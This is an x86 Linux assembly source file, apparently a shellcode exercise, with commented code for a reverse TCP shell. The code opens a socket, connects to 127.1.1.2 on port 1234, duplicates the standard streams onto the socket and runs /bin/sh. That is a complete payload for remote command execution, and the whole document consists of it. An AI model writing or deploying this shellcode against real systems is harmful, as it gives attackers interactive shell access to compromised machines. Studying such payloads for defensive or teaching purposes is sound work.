section .text
  global _start

_start:
  ; make socketfd
  ; socketfd = (AF_INET, SOCK_STREAM, 0)
  push 0x66     ; mov esp, sock_call()
  pop eax       ; mov top of stack (0x66) into eax
  push 0x1
  pop ebx       ; EBX = 0x1
  xor edx,edx  ; set edx = 0
  push edx      ; protocol = IPPROTO_IP (0x0)
  push ebx      ; socket_type = SOCK_STREAM (0x1)
  push 0x2      ; socket_family = AF_INET (0x2)
  mov ecx, esp  ; save pointer to socket() args
  int 0x80      ; exec sys_socket
  ; ================================================================================
  ; Assign IP, Port
  ; servaddr.sin_family = AF_INET;
  ; servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  ; servaddr.sin_port = htons(PORT);

  xchg edx, eax ; save result (sockfd)
  mov al, 0x66
  push 0x0201017f   ; sin_addr = 127.1.1.2 (network byte order) ; sin: socket in
  push word 0xd204  ; sin_port = 1234 (network byte order) ; sin: socket in
  inc ebx       ; 0x1 -> 0x2
  push word bx  ; sin_family = AF_INET (0x2)
  mov ecx, esp  ; save pointer to sockaddr struct
  push 0x10     ; addrlen = 16
  push ecx      ; pointer to sockaddr
  push edx      ; sockfd
  mov ecx, esp  ; save pointer to sockaddr_in struct
  inc ebx       ; sys_connect (0x3)
  int 0x80      ; exec sys_connect
  push 0x2      ; define 2
  pop ecx       ; for the loop
  xchg ebx,edx ; save sys_connect() to edx

loop:
  mov al, 0x3f  ; dup2()
  int 0x80      ; exec dup2()
  dec ecx       ; ecx -= 1
jns loop
  mov al, 0x0b      ; execve()
  xor ebx,ebx       ; zero out ebx
  push ebx          ; 0x0 (this will not add \003 - which is terminated code)
  push 0x68732F2F   ; hs//
  push 0x6E69622F   ; nib/
  mov ebx, esp      ; add argument "/bin//sh"
  xor ecx, ecx      ; zero out ecx
  mov edx, ecx
  int 0x80